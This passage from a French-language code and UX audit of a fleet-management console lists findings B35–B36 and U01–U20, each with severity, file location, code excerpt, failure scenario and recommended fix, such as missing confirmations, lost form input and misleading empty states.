**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `agent/internal/agent/agent.go:566`

Quand un agent plus ancien que le serveur reçoit un type qu'il ne connaît pas, execute journalise puis retourne sans poster de résultat. Le code le présente comme le cas prévu « newer server talking to an older agent ». Le serveur a déjà passé la commande à DELIVERED et ne la renverra pas, et rien ne l'expire. L'administrateur n'obtient ni message ni échec, et le dédoublonnage bloque toute relance jusqu'à expires_at.

```
run, long, ok := a.resolve(cmd)
	if !ok {
		log.Printf("agent: unknown command type %q (id %s), ignoring", cmd.Type, cmd.ID)
		return
	}
```

**Scénario.** Après la migration 0029, un administrateur lance package_install sur une salle où une partie des postes a encore un agent antérieur au déploiement logiciel. Sur ces postes, la commande reste « transmise » jusqu'à la purge annuelle, sans le message « agent trop ancien » qui permettrait à l'administrateur de comprendre et de mettre l'agent à jour.

**Recommandation.** Poster un résultat `failed` explicite, par exemple « type de commande non pris en charge par l'agent vX.Y, mettre l'agent à jour » via a.refuse(ctx, cmd, err), plutôt qu'un simple retour silencieux. On peut aussi éviter côté serveur de remettre un type à un agent dont agent_version est trop ancienne.

<a id="b35"></a>

#### B35 — Le choix du responsable de maintenance dépend de check:read

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/components/maintenance/MaintenanceSettingsDialog.vue:98`

La liste des responsables possibles vient de GET /checks/assignable-users, qui exige check:read. Elle est utilisée dans le dialogue de maintenance (salle ou poste, maintenance:write) et dans la page Paramètres (SettingsPage.vue:799, settings:write). Un compte qui a ces droits sans check:read reçoit un 403. Le menu « Responsable » reste vide, ou affiche un UUID brut pour la valeur existante. Dans la page Paramètres, l'appel se trouve dans le même try que le chargement : il déclenche la notification « Vous n'avez pas la permission requise », que le dialogue de maintenance affiche lui aussi.

```
ownerOptions.value = (await listAssignableUsers()).map((u) => ({ label: u.name, value: u.id }));
```

**Scénario.** Reproduit : groupe ['machine:read','maintenance:read','maintenance:write','room:read']. GET /api/v1/checks/assignable-users renvoie 403. Le dialogue « Maintenance — salle » n'offre alors aucun responsable à choisir.

**Recommandation.** Ouvrir la route à check:read OU maintenance:write OU settings:write, ou exposer une route neutre (par exemple /users/assignable) protégée par une dépendance « au moins une de ces permissions ».

<a id="b36"></a>

#### B36 — Supprimer un fichier absent d'un paquet affiche « Paquet introuvable »

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `backend/app/api/routes/packages.py:428`

Quand le fichier n'existe pas, DELETE /packages/{id}/files/{name} lève ErrorCode.PACKAGE_NOT_FOUND. La console traduit les codes, pas les messages (services/errors.ts). Elle affiche donc « Paquet introuvable » alors que le paquet existe et que c'est le fichier qui manque, par exemple s'il a déjà été supprimé dans un autre onglet.

```
raise AppError(
            code=ErrorCode.PACKAGE_NOT_FOUND, status_code=404, message="File not found"
        )
```

**Scénario.** Deux administrateurs ouvrent le même paquet. Le premier supprime setup.exe. Le second clique ensuite sur « supprimer » pour ce même fichier et voit la notification « Paquet introuvable », ce qui laisse croire que le paquet a été supprimé.

**Recommandation.** Créer un code dédié (par exemple package.file.not_found) dans ErrorCode et dans ERROR_MESSAGES, avec le libellé « Fichier introuvable dans ce paquet ».


### 7.3 UI / UX

<a id="u01"></a>

#### U01 — Fiche poste : passer au poste précédent/suivant en échec laisse une page vide sans message d'erreur durable

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/MachineDetailPage.vue:197`

Quand on change de poste avec les flèches, le watcher de props.id remet `machine` à null puis relance load(). Si le chargement échoue, `lastRefreshedAt` contient encore la date du poste précédent : la condition `lastError && !lastRefreshedAt` est fausse et le bandeau n'apparaît pas. Il ne reste que le titre générique « Poste » et « Actualisé à HH:MM:SS », une heure qui appartient au poste précédent. Aucun onglet, aucune carte, et pour seule explication un toast passager : celui du journal des interventions (« Poste introuvable » ou « Historique indisponible »), que seuls voient les comptes dotés d'intervention:read. Même sans erreur, la page reste vide pendant le chargement : le seul indicateur est le petit spinner du bouton Actualiser.

```
watch(
  () => props.id,
  () => {
    machine.value = null;
    ...
    void load();
  },
);
...
<LoadErrorBanner
      v-if="lastError && !lastRefreshedAt"
```

**Scénario.** Le technicien parcourt les résultats d'une recherche avec ▶. Le poste suivant vient d'être supprimé par une fusion (404 « Poste introuvable »), ou le réseau coupe. L'écran affiche « Poste », « Actualisé à 10:42:03 » et rien d'autre. Il ne sait pas si le poste existe, si la page charge encore ou si quelque chose a échoué.

**Recommandation.** Réinitialiser l'état de rafraîchissement quand l'identifiant change, ou conditionner le bandeau à `lastError && !machine`. Masquer « Actualisé à » tant que `machine` est null, et afficher un état de chargement (q-skeleton ou q-inner-loading) dans le corps de la page tant que le poste n'est pas chargé.

<a id="u02"></a>

#### U02 — Groupes : un emplacement saisi sans appuyer sur Entrée est perdu en silence, et le groupe s'ouvre à tout le parc

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/GroupsPage.vue:197`

Le champ « Emplacements » est un q-select multiple en saisie libre (use-input + new-value-mode). Quasar ne transforme le texte tapé en valeur qu'à l'appui sur Entrée. Quand le champ perd le focus, QSelect efface le texte (QSelect.js, onFocusout → resetInputValue). Si l'administrateur tape un emplacement puis clique directement sur « Enregistrer », form.scope.locations reste vide. scopeOrNull envoie alors scope=null, ce qui signifie « tout le parc » (texte de la ligne 192). Rien ne prévient l'utilisateur et aucun contrôle n'existe avant l'envoi.

```
<q-select
  v-model="form.scope.locations"
  :options="locationOptions"
  ...
  use-input
  new-value-mode="add-unique"
  hint="Tels que les agents les déclarent ; saisie libre possible"
/>
...
scope: scopeOrNull(form.scope),
```

**Scénario.** Un administrateur crée le groupe « Techniciens site Nord ». Il coche « commandes courantes », tape « Lycée Nord » dans Emplacements (cet emplacement n'est pas encore dans la liste remontée par les agents) et clique sur Enregistrer. Le groupe est enregistré sans restriction : ses membres voient les postes de tous les sites et peuvent y lancer des commandes. La notification indique « Groupe créé » et la colonne Postes affiche « Tout le parc », que personne ne relit.

**Recommandation.** Ajouter la valeur tapée au blur, ou bien, avant submitForm, valider le texte en cours de saisie (ref QSelect : add/updateInputValue). Prévoir aussi un garde-fou : si le champ contient du texte non validé, ou si aucun périmètre n'est coché sur un groupe non administrateur, demander confirmation explicite que le groupe concerne « tout le parc ».

<a id="u03"></a>

#### U03 — Le message d'erreur précis du backend est remplacé par un libellé générique (« Paquet invalide », « Requête invalide »)

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/services/errors.ts:90`

apiErrorMessage affiche toujours la traduction du code quand elle existe, et ignore donc error.message et error.details. Or le backend fournit des messages en français qui disent quoi corriger sous le code package.invalid (« Installation par msiexec : indiquer les arguments (ex. /i {dir}\app.msi /qn) », « Identifiant winget invalide (ex. Mozilla.Firefox) », « Nom de fichier à lancer invalide »). Ses erreurs 422 de validation placent aussi les champs fautifs dans details.errors. Le formulaire de définition de PackageDetailPage n'a aucune validation côté client. L'utilisateur ne voit donc que « Paquet invalide » ou « Requête invalide », sans savoir quel champ corriger.

```
if (code && ERROR_MESSAGES[code]) {
    return ERROR_MESSAGES[code];
  }
  return body?.error?.message ?? fallback;
// errors.ts:51  'package.invalid': 'Paquet invalide',
// errors.ts:70  'request.validation_error': 'Requête invalide',
// backend packages.py:258 raise _invalid("Installation par msiexec : indiquer les arguments (ex. /i {dir}\\app.msi /qn)")
```

**Scénario.** Sur un paquet de fichiers, l'utilisateur choisit « msiexec » comme fichier à lancer et laisse les arguments vides, puis clique sur Enregistrer. La notification affiche « Paquet invalide ». Autre cas : il vide « Codes de sortie acceptés » ; success_codes=[] est refusé par _check_codes (« entre 1 et 32 codes de succès ») et il ne voit que « Requête invalide ». Dans les deux cas, il doit deviner quel champ pose problème.

**Recommandation.** Pour les codes dont le message backend est rédigé pour l'utilisateur (package.invalid au minimum), afficher error.message, ou combiner libellé et détail. Pour request.validation_error, extraire details.errors[].loc et nommer le champ. Ajouter aussi dans PackageDetailPage les règles client équivalentes : nom requis, regex winget, arguments obligatoires avec msiexec, codes numériques non vides.

<a id="u04"></a>

#### U04 — Désinstaller sur tout le parc en un clic : aucune confirmation, et le périmètre « Tout le parc » est conservé d'une ouverture à l'autre

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/components/package/PackageDeployDialog.vue:157`

Le watcher d'ouverture remet à zéro action, chosenId et location, mais pas scope. Sur PackageDetailPage, le dialogue reste monté en permanence. Après un déploiement sur « Tout le parc », la prochaine ouverture, même via « Désinstaller », s'affiche avec scope='all'. Le bouton « Désinstaller sur tout le parc » est alors actif tout de suite (ready=true, car le paquet est fixé). send() envoie target_all sans dialogue de confirmation et sans indiquer le nombre de postes. À l'inverse, les actions en masse de la liste des postes demandent confirmation avec le nombre de postes (useMachineBulkActions.ts:77).

```
action.value = props.initialAction ?? 'install';
    chosenId.value = null;
    location.value = null;
    // scope n'est pas réinitialisé
...
    : scope.value === 'all'
      ? { target_all: true }
```

**Scénario.** Le matin, un administrateur installe LibreOffice sur « Tout le parc ». L'après-midi, sur la même page, il clique sur « Désinstaller » pour retirer le logiciel d'une seule salle. Le dialogue s'ouvre déjà sur « Tout le parc » avec le bouton rouge actif ; un clic machinal envoie la désinstallation à tous les postes.

**Recommandation.** Réinitialiser scope à 'location' à chaque ouverture. Pour target_all, et pour toute désinstallation, afficher une confirmation qui indique le nombre de postes visés, comme commandConfirm pour les actions en masse.

<a id="u05"></a>

#### U05 — Fiche paquet : déposer un fichier, signer ou retirer le paquet efface les modifications non enregistrées de la définition

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/PackageDetailPage.vue:552`

upload(), removeFile(), sendSignature(), unsign() et toggleRetired() appellent tous fill(updated), qui écrase tout le formulaire « Définition » avec la version serveur. Seul install_run est conservé, et uniquement dans upload(). Les arguments, codes de sortie, notes ou le nom dans l'inventaire saisis mais pas encore enregistrés sont perdus sans avertissement. À l'inverse, le fichier à lancer choisi automatiquement après le dépôt (ligne 549) reste dans le formulaire sans être enregistré : le bandeau « Pas encore déployable » demeure et le badge « lancé » n'apparaît pas.

```
if (!updated.install_run) {
      const exe = updated.files.find((f) => /\.(exe|msi)$/i.test(f.name));
      if (exe) form.install_run = exe.name;
    }
    const keepRun = form.install_run;
    fill(updated);
    form.install_run = keepRun;
```

**Scénario.** Pour Pronote, l'administrateur tape les arguments d'installation `-s -f1"{dir}\ClientPRONOTE.iss"` puis se rend compte qu'il manque le fichier .iss. Il le dépose : les arguments saisis sont effacés, et il n'a reçu que la notification « Fichiers déposés ».

**Recommandation.** Dans les actions secondaires, ne mettre à jour que pkg (fichiers, signature, problems), sans écraser le formulaire. Ou bien fusionner seulement les champs non modifiés, à partir d'un instantané « dirty ». Signaler les modifications non enregistrées (indicateur sur le bouton Enregistrer, garde onBeforeRouteLeave).

<a id="u06"></a>

#### U06 — Paramètres : les seuils numériques ne sont pas validés côté client, et un champ vidé devient 0 sans avertissement

**Sévérité :** Moyenne · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/SettingsPage.vue:844`

Les cartes « Maintenance » et « Supervision du parc » n'ont pas de validation côté client, contrairement à la carte « Utilisation » (usageSettingsError). Les attributs min et max des q-input ne bloquent rien, car il n'y a pas de q-form. Un champ numérique vidé renvoie '' ; saveFleet le convertit avec Number('') = 0. Pour signature_max_age_days (ge=0), le serveur accepte 0 sans erreur : toutes les bases antivirus de plus de 0 jour sont alors périmées. Les autres valeurs hors bornes (inactive_after_days=0, cycle=5000, ou '' envoyé tel quel par save()) ne donnent que « Requête invalide », sans nommer le champ.

```
signature_max_age_days: Number(fleetForm.signatureMaxAgeDays),
inactive_after_days: Number(fleetForm.inactiveAfterDays),
...
// save(): maintenance_default_cycle_days: form.cycle,  (peut valoir '')
```

**Scénario.** L'administrateur efface « Base antivirus périmée au-delà de » pour retaper la valeur, puis clique sur Enregistrer de la carte avant d'avoir saisi le nouveau nombre. Le serveur enregistre 0 et, comme l'indique l'aide, recalcule aussitôt tout le parc : presque tous les postes passent en « base périmée ». La notification annonce « Paramètres enregistrés ».

**Recommandation.** Ajouter pour ces cartes une fonction de validation comme usageSettingsError : champ requis, entier, dans les bornes du serveur. Afficher l'erreur sous le champ concerné et désactiver Enregistrer tant qu'elle existe. Ne jamais convertir '' en 0.

<a id="u07"></a>

#### U07 — Tableau de bord : « Aucune menace active. » s'affiche pendant le chargement et quand l'API est en panne

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/DashboardPage.vue:145`

Les listes « Postes à mettre à jour » et « Menaces actives » affichent leur message vide dès que le tableau est vide. Or il est vide avant la première réponse et après un échec. Les cartes KPI, elles, disparaissent dans ce cas (computed → [] quand stats est null). Pendant le chargement, ou quand le bandeau rouge annonce que le serveur ne répond pas, la seule information de sécurité encore visible est donc « Aucune menace active. » et « Aucun poste non à jour. ». Sur un écran mural, ce sont des affirmations rassurantes et fausses.

```
<q-item v-if="!threats.length">
              <q-item-section class="text-muted">Aucune menace active.</q-item-section>
            </q-item>
...
<q-item v-if="!outdated.length">
              <q-item-section class="text-muted">Aucun poste non à jour.</q-item-section>
```

**Scénario.** Au démarrage de la console, l'API ne répond pas. Le bandeau dit « Chargement impossible », mais la carte Menaces actives affiche « Aucune menace active. ». Sur un écran mural lu de loin, l'opérateur retient l'absence de menace. Le même texte apparaît aussi pendant la seconde de chargement normal, avant que la vraie menace n'apparaisse.

**Recommandation.** N'afficher le message vide que si `stats` (ou un indicateur « chargé ») est renseigné et que la dernière requête a réussi. Sinon, afficher un squelette ou « Données indisponibles ». Corriger aussi la double négation « Aucun poste non à jour » en « Tous les postes sont à jour ».

<a id="u08"></a>

#### U08 — Filtre « logiciel » anonyme, et invisible quand le panneau de filtres est ouvert

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/utils/machineListFilters.ts:494`

Quand on arrive sur la liste depuis le catalogue (« 148 poste(s) ») ou depuis la fiche (bouton « Voir les postes qui l'ont »), la seule trace du filtre `software_id` est la puce générique « Postes portant un logiciel ». Elle ne dit ni le nom ni la version. Ces puces ne s'affichent en plus que quand le panneau est replié (`v-if="!filtersOpen && chips.length"`), et le panneau n'a aucun contrôle pour ce filtre. Une fois le panneau ouvert, la liste est réduite sans que rien ne dise pourquoi. C'est précisément ce que le commentaire du composant veut éviter (« A folded filter must never narrow the list silently »).

```
if (f.softwareId != null) {
    chips.push({ key: 'software', label: 'Postes portant un logiciel' });
  }
// MachinesFiltersBar.vue:73
<div v-if="!filtersOpen && chips.length" class="row items-center q-mb-sm">
```

**Scénario.** Depuis Logiciels, l'utilisateur clique « 12 poste(s) » sur « 7-Zip 23.01 ». La liste affiche 12 postes avec la puce « Postes portant un logiciel », sans dire lequel. Il ouvre « Filtres » pour ajouter un critère de salle : la puce disparaît, le panneau indique « 1 filtre(s) actif(s) » sans dire lequel, et la liste reste limitée à 12 postes sans explication.

**Recommandation.** Faire figurer dans la puce le nom et la version du logiciel, par exemple en ajoutant `software_name` à la requête ou en le récupérant via l'API. Afficher les puces même quand le panneau est ouvert, ou ajouter dans le panneau une ligne « Logiciel : 7-Zip 23.01 ✕ ».

<a id="u09"></a>

#### U09 — Page Logiciels : « Aucun logiciel inventorié pour l'instant » s'affiche pour une recherche sans résultat ou après une erreur

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/SoftwarePage.vue:67`

Le libellé vide du tableau est le même dans trois cas différents : parc jamais inventorié, recherche sans correspondance, échec du chargement. En cas d'échec, load() envoie une notification qui disparaît après quelques secondes, puis le tableau affiche durablement « Aucun logiciel inventorié pour l'instant. ». La page n'utilise pas LoadErrorBanner, contrairement au tableau de bord, à la liste et à la fiche des postes, et à la fiche d'un paquet.

```
no-data-label="Aucun logiciel inventorié pour l'instant."
...
  } catch (e) {
    $q.notify({ type: 'negative', message: apiErrorMessage(e, 'Échec du chargement') });
```

**Scénario.** L'utilisateur tape « Acrobat » alors qu'aucun poste ne l'a : la console dit « Aucun logiciel inventorié pour l'instant », comme si l'inventaire était désactivé. Ou bien l'API renvoie une 500 à l'ouverture : après la notification, la page affirme qu'aucun logiciel n'a été inventorié.

**Recommandation.** Rendre le libellé dépendant du contexte : « Aucun logiciel ne correspond à « X » » quand une recherche est active. Afficher LoadErrorBanner, avec Réessayer, quand le chargement a échoué.

<a id="u10"></a>

#### U10 — Le routeur remonte toujours en haut de page, même au retour arrière

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/router/index.ts:36`

scrollBehavior renvoie toujours {top: 0} et ignore `savedPosition`. Avec le bouton Retour du navigateur, la liste des postes (jusqu'à 100 lignes par page) revient en haut au lieu de la ligne d'où la fiche a été ouverte. La fonction s'applique aussi à chaque router.replace de query, donc à chaque changement d'onglet sur la fiche et à chaque changement de page de la liste.

```
const router = createRouter({
    scrollBehavior: () => ({ left: 0, top: 0 }),
```

**Scénario.** La liste est réglée sur 100 lignes par page. L'utilisateur descend jusqu'à la 70e ligne, ouvre la fiche, puis fait Retour. La page remonte en haut et il doit retrouver sa ligne à la main, à chaque poste consulté.

**Recommandation.** Utiliser `scrollBehavior: (to, from, saved) => saved ?? (to.path === from.path ? false : { top: 0 })`. Pour la liste, chargée de façon asynchrone, restaurer la position après le chargement des lignes, par exemple en renvoyant une Promise ou en mémorisant la position.

<a id="u11"></a>

#### U11 — Dialogue de fusion : min-width 560px déborde sur mobile

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/components/machine/MachineMergeDialog.vue:3`

La carte du dialogue fixe `min-width: 560px; max-width: 90vw`. En CSS, quand min-width est supérieur à max-width, c'est min-width qui l'emporte. Sur un écran de moins de 560 px, la carte fait donc 560 px et dépasse de l'écran. Les boutons « Fusionner ici », placés à droite de chaque ligne, se retrouvent en partie hors de la zone visible pour une action irréversible.

```
<q-card style="min-width: 560px; max-width: 90vw">
```

**Scénario.** Un technicien ouvre la fiche sur un smartphone (375 px) et clique « Fusionner (1) ». Le dialogue, centré, dépasse d'environ 92 px de chaque côté : le début du nom et de l'UUID est coupé à gauche, le bouton d'action à droite, et la partie gauche ne s'atteint pas par défilement. CommandOutputDialog.vue:3 a le même défaut (`min-width: 480px`).

**Recommandation.** Remplacer par `width: 560px; max-width: 95vw`, comme dans les autres dialogues du dépôt (par exemple MachineHistoryCard : `width: 520px; max-width: 95vw`).

<a id="u12"></a>

#### U12 — Révocation du token : bouton de confirmation générique « OK », sans couleur d'alerte

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/MachineDetailPage.vue:854`

La confirmation de « Révoquer le token », qui coupe le poste du serveur jusqu'à une ré-autorisation, utilise `cancel: true` sans option `ok`. Le bouton de validation est donc le « OK » par défaut de Quasar, dans la couleur primaire. La suppression d'une intervention, bien moins grave, a pourtant un bouton « Supprimer » en rouge (MachineHistoryCard.vue:218). Le libellé ne dit pas l'action effectuée, et l'action la plus lourde de la fiche est la moins signalée.

```
$q.dialog({
    title: 'Révoquer le token',
    message: 'Le poste sera coupé du serveur ... Continuer ?',
    cancel: true,
    persistent: true,
  })
```

**Scénario.** L'administrateur clique par erreur sur « Révoquer le token », placé juste à côté de « Fusionner ». Le dialogue propose « Annuler » et « OK » (bleu). Par réflexe, il valide « OK » et le poste perd son accès au serveur.

**Recommandation.** Passer `ok: { label: 'Révoquer', color: 'negative', noCaps: true }` et `cancel: { label: 'Annuler', flat: true }`. Faire de même pour « Autoriser le ré-enrôlement » (libellé « Autoriser »).

<a id="u13"></a>

#### U13 — Réinitialisation de mot de passe : le mot de passe affiché une seule fois disparaît sur un clic hors du dialogue ou sur Échap

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/UsersPage.vue:215`

Le dialogue de réinitialisation n'est pas `persistent`, et @hide remet resetResult à null. Une fois le mot de passe généré, le serveur l'a déjà appliqué et a fermé les sessions du compte. L'interface précise qu'« il n'est plus consultable ensuite ». Un clic sur le fond ou la touche Échap ferme pourtant le dialogue et efface le mot de passe, sans confirmation. Par ailleurs, copyResult n'intercepte pas l'échec de copyToClipboard : en cas d'échec, l'utilisateur n'a aucun retour.

```
<q-dialog v-model="resetOpen" @hide="resetResult = null">
...
<div class="text-body2">
  Mot de passe défini. Il n'est plus consultable ensuite — transmettez-le maintenant,
```

**Scénario.** L'administrateur clique sur Réinitialiser en mode « Générer ». Le mot de passe s'affiche. En allant cliquer sur l'icône de copie, il clique juste à côté de la carte : le dialogue se ferme. Le mot de passe est perdu, le compte est inutilisable et ses sessions ont été fermées. Il doit refaire une réinitialisation, qui sera elle aussi tracée dans le journal d'audit.

**Recommandation.** Rendre le dialogue `persistent`, au moins quand resetResult !== null, et ne le fermer que par le bouton « Fermer ». Entourer copyToClipboard d'un try/catch avec une notification d'échec.

<a id="u14"></a>

#### U14 — Saisie de maintenance : les notes par poste sont perdues si le dialogue se ferme par Échap ou par un clic à côté

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/components/maintenance/MaintenanceSessionDialog.vue:131` · aussi : `frontend/src/components/maintenance/MaintenanceSessionDialog.vue:5`

Ce dialogue est un long formulaire : une date, une observation générale, puis une case et une note par poste de la salle. Il n'est pas persistent : Échap ou un clic sur le fond le ferment sans confirmation. En plus, le watcher réinitialise tout à chaque ouverture (note, date, lignes toutes cochées, notes vides). Rien de ce qui a été saisi n'est conservé.

```
<q-dialog :model-value="modelValue" @update:model-value="(v) => emit('update:modelValue', v)">
...
watch(
  () => props.modelValue,
  (open) => {
    if (!open) return;
    note.value = '';
    performedAt.value = toLocalInput(new Date());
    rows.value = props.machines.map((m) => ({ ... done: true, note: '' }));
```

**Scénario.** Un technicien remplit des observations pour 25 postes d'une salle et décoche 3 postes absents. Il appuie sur Échap par réflexe, ou clique hors de la carte : le dialogue se ferme. À la réouverture, toutes les notes ont disparu et les 25 postes sont de nouveau cochés.

**Recommandation.** Passer le dialogue en `persistent`, ou intercepter la fermeture (@before-hide ou bouton Annuler) avec une confirmation dès qu'une note est saisie ou qu'une case a été modifiée. Ne réinitialiser le formulaire qu'après un enregistrement réussi ou une annulation confirmée.

*Signalé aussi sous un autre angle :* Séance de maintenance d'une salle : toute la saisie est perdue sur un clic hors du dialogue ou sur Échap

<a id="u15"></a>

#### U15 — Formulaires de création de compte et de réinitialisation : pas d'attribut autocomplete, le gestionnaire de mots de passe confond avec le compte de l'admin

**Sévérité :** Faible · **Statut :** plausible (dépend du contexte) · **Emplacement :** `frontend/src/pages/UsersPage.vue:194`

Le dialogue « Nouveau compte » contient un champ type=email suivi d'un champ type=password, sans autocomplete. Le gestionnaire de mots de passe du navigateur y voit un formulaire de connexion pour le même site. Il peut proposer ou préremplir les identifiants de l'administrateur connecté, puis, après l'envoi, proposer d'enregistrer ou de mettre à jour un mot de passe pour ce site avec les identifiants du nouveau compte. Le champ « Nouveau mot de passe » du mode manuel de réinitialisation a le même défaut. Les autres pages (Login, Mon compte, ResetPassword) déclarent correctement username, current-password et new-password : le comportement n'est donc pas cohérent.

```
<q-input
  v-if="!editing"
  v-model="form.password"
  type="password"
  label="Mot de passe"
  outlined
  dense
  :hint="`${PASSWORD_MIN_LENGTH} caractères minimum`"
  :rules="[required, longEnough]"
/>
```

**Scénario.** Un administrateur, dont le navigateur a enregistré ses identifiants pour la console, crée le compte d'un collègue. Après l'enregistrement, Chrome propose « Mettre à jour le mot de passe ? » pour la console, avec l'e-mail et le mot de passe du collègue. S'il accepte, sa prochaine connexion sera préremplie avec le mauvais compte.

**Recommandation.** Ajouter autocomplete="off" sur l'e-mail du compte créé et autocomplete="new-password" sur les deux champs de mot de passe (création et réinitialisation manuelle).

<a id="u16"></a>

#### U16 — Dépôt de fichiers d'un paquet : pas d'annulation, pas de contrôle de taille avant l'envoi, et un refus de Caddy n'affiche qu'un message générique

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/PackageDetailPage.vue:538`

upload() envoie la requête multipart sans délai d'expiration (timeout: 0) et sans AbortController. Aucun bouton n'arrête un dépôt de plusieurs centaines de Mo, et quitter la page ne l'interrompt pas. La taille n'est pas vérifiée avant l'envoi. Caddy limite le corps entier de la requête à « 2GB » (2·10^9 octets, toutes pièces confondues), alors que le backend accepte 2 Gio par fichier. Un dépôt plusieurs fichiers dont le total dépasse 2 Go, ou un fichier entre 2·10^9 et 2^31 octets, est refusé par Caddy après le transfert, avec un corps 413 qui n'est pas au format JSON. L'utilisateur ne voit alors que « Dépôt impossible ».

```
const updated = await uploadPackageFiles(pkg.value.id, toUpload.value, (f) => {
      uploadProgress.value = f;
    });
...
} catch (e) {
    notifyError(e, 'Dépôt impossible');
// deploy/Caddyfile:60-62  request_body @package_upload { max_size 2GB }
```

**Scénario.** L'administrateur sélectionne d'un coup l'installateur LibreOffice (350 Mo), une ISO de pilotes (1,8 Go) et le fichier de réponses. La barre de progression va jusqu'au bout, puis la notification affiche « Dépôt impossible », sans dire que la limite est de 2 Go par envoi ni qu'il faut déposer les fichiers séparément.

**Recommandation.** Vérifier la taille de chaque fichier et du total avant l'envoi, en affichant la limite. Ajouter un bouton Annuler (AbortController passé à axios via signal). Pour les statuts 413 sans enveloppe JSON, afficher « Fichier trop volumineux (limite : … ) ». Mettre d'accord les unités (2GiB dans Caddy).

<a id="u17"></a>

#### U17 — Explication incompréhensible sous le réglage « Vérifier le certificat du serveur »

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/SettingsPage.vue:410`

Désactiver ce réglage supprime la vérification TLS du relais SMTP. La seule explication affichée est « Non seulement pour un relais interne à certificat privé », qui veut dire « pas uniquement pour… » : c'est l'inverse de l'intention, sans doute « ne désactivez que pour un relais interne ». Le message du test d'envoi (probe.py:82) donne la bonne consigne, mais la page elle-même n'explique pas le risque.

```
<q-toggle
  v-model="emailForm.smtpVerifyTls"
  label="Vérifier le certificat du serveur"
  :disable="!canWrite"
/>
<div class="text-caption text-muted">
  Non seulement pour un relais interne à certificat privé · valeur du serveur :
```

**Scénario.** Un administrateur peu familier de TLS lit « Non seulement pour un relais interne… » et comprend qu'il peut aussi désactiver la vérification pour Microsoft 365. Il la coupe « pour que ça marche », et les identifiants SMTP transitent ensuite vers un serveur dont l'identité n'est plus vérifiée.

**Recommandation.** Reformuler, par exemple : « À ne désactiver que pour un relais interne à certificat privé : sans vérification, une interception du trafic SMTP (et du mot de passe) n'est plus détectée. »

<a id="u18"></a>

#### U18 — Pas de moyen de prendre en charge une maintenance « À prendre » depuis Mes tâches

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/pages/TasksPage.vue:152`

Pour les vérifications, le menu de ligne propose « Me l'affecter » et « Réaffecter / modifier ». Pour les maintenances, la portée « À prendre » (owner=none) affiche les salles sans responsable, mais l'expansion ne contient que « Voir la salle » et « Effectuer la maintenance ». Pour se déclarer responsable ou transmettre la salle, il faut ouvrir la salle, cliquer « Régler », choisir son nom dans la liste et enregistrer. Le parcours d'affectation est donc incohérent entre les deux types de tâches.

```
<q-btn flat dense icon="meeting_room" label="Voir la salle" ... :to="{ name: 'room-detail', params: { id: r.id } }" />
<q-btn v-if="canMaintain" dense color="primary" icon="build" label="Effectuer la maintenance" @click="openSession(r)" />
```

**Scénario.** Un technicien ouvre « À prendre », voit la salle B03 « sans responsable · 5 en retard » et veut la prendre. Il lui faut au moins 5 actions et deux pages (Voir la salle → Régler → ouvrir la liste Responsable → choisir son nom → Enregistrer), contre 2 clics pour une vérification.

**Recommandation.** Ajouter dans l'en-tête ou l'expansion de chaque salle un bouton « Me l'affecter » (updateRoomMaintenance avec maintenance_owner_id = moi) et « Transmettre… » (le dialogue de réglage réduit au responsable).

<a id="u19"></a>

#### U19 — Le badge « Mes tâches » ne compte que les vérifications et n'est pas mis à jour après une clôture

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/layouts/MainLayout.vue:102`

Le compteur du menu ne prend en compte que les vérifications ouvertes qui me sont affectées. Les maintenances en retard dont je suis responsable n'y figurent pas. Il n'est recalculé qu'au changement de route ou de compte : clore une vérification depuis la page Mes tâches, qui ne change pas de route, laisse le compteur à l'ancienne valeur.

```
async function countMyTasks() {
  ...
    myTasks.value = (await listChecks({ open: true, assigned_to: 'me', page_size: 1 })).total;
...
watch(() => router.currentRoute.value.fullPath, () => void countMyTasks());
```

**Scénario.** Capture MesTaches.png : le badge affiche « 2 » alors que la page montre aussi « 8 en retard » en maintenance. Le technicien qui se fie au badge sous-estime sa charge. Après avoir cliqué « Clore » sur l'une des deux vérifications, le badge reste à 2 tant qu'il ne quitte pas la page.

**Recommandation.** Inclure dans le badge les postes en retard de getDue('me'), ou afficher deux pastilles. Relancer le comptage après closeCheck et après recordSession, par exemple via un store ou un événement global.

<a id="u20"></a>

#### U20 — Impossible de noter pourquoi un poste n'a pas été fait : le champ d'observation est désactivé quand le poste est décoché

**Sévérité :** Faible · **Statut :** vérifié · **Emplacement :** `frontend/src/components/maintenance/MaintenanceSessionDialog.vue:63`

L'observation par poste est désactivée dès que la case est décochée, et seuls les postes cochés sont envoyés. Le commentaire du composant prévoit pourtant de décocher les postes absents ou éteints, mais la raison de l'absence ne peut être saisie que dans la note générale. Elle n'apparaît alors pas dans l'historique du poste concerné. Si le technicien saisit une note puis décoche le poste, la note reste affichée dans le champ grisé mais n'est pas envoyée, sans avertissement.

```
<q-input v-model="row.note" ... :disable="!row.done" />
...
items: rows.value.filter((r) => r.done).map((r) => ({ machine_id: r.id, note: r.note.trim() || null })),
```

